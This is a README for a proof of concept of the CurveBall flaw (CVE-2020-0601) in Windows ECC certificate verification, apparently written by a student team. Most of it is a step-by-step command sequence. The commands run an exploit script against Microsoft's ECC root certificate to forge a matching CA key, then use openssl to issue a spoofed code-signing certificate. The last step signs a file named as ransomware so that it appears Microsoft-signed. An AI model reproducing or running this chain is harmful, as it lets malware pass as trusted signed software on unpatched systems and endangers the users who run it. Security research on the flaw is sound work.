# CurveBall (CVE-2020-0601) - PoC

This vulnerability, known as CurveBall, is due to invalid verification of certificates that using the ECC algorithm. Windows try to verify previously verified certificates from the certificate cache and while doing this, it only checks whether the public keys of the certificates are identical and does not check other parameters.


# Mathematical details

To spoof the certificate, we explicitly set the parameters as below:

    d' = 1 
    G' = Q

If you need more information, you can check mathematical details section of **final_report_milestone_IV.pdf** file.

## Usage (Code Signing)

In this poc, let's use **"Microsoft ECC Product Root Certificate Authority"**, which is Microsoft's trusted certificate until year 2043.

Let’s extract the public key from the CA and modify it according to the vulnerability

    ruby exploit.rb ./MicrosoftECCProductRootCertificateAuthority.cer

We generate a new x509 certificate based on this key. This will be our own spoofed CA.

    openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt
    
To see content of the spoofed_ca.crt

    openssl x509 -in sppofed_ca.crt -noout -text
	
We generate a new key. This key can be of any type you want. It will be used to create a code signing certificate, which we will sign with our own CA.

    openssl ecparam -name secp384r1 -genkey -noout -out cert.key


Next up, we create a new certificate signing request (CSR). This request will oftenly be sent to trusted CA's, but since we have a spoofed one, we can sign it ourselves.

    openssl req -new -key cert.key -out cert.csr -config openssl_cs.conf -reqexts v3_cs

We sign our new CSR with our spoofed CA and CA key. This certificate will expire in 2047, whereas the real trusted Microsoft CA will expire in 2043.

    openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_cs.conf -extensions v3_cs

The only thing left is to pack the certificate, its key and the spoofed CA into a PKCS12 file for signing executables.

    openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile spoofed_ca.crt -name "Code Signing" -out cert.p12

Let’s sign our executable with PKCS12 file.

    osslsigncode sign -pkcs12 cert.p12 -n "Signed by PISP Team" -in unsigned_ransomware.exe -out microsoft_signed_ransomware.exe -pass 1234

Now, we have brand new ransomware **signed by Microsoft :)**


## Contributors

|                |ID|
|----------------|-------------------------------|
|Okan ÜLKER|`17050111024`            |
|Emre KÖRÜS|`16050111041`|
|Mehmet Ali CABİOĞLU|`16050111044`|
|Şevval AYDOĞDU|`15050111038`|
|Cansu KORKUT|`16050111049`            |
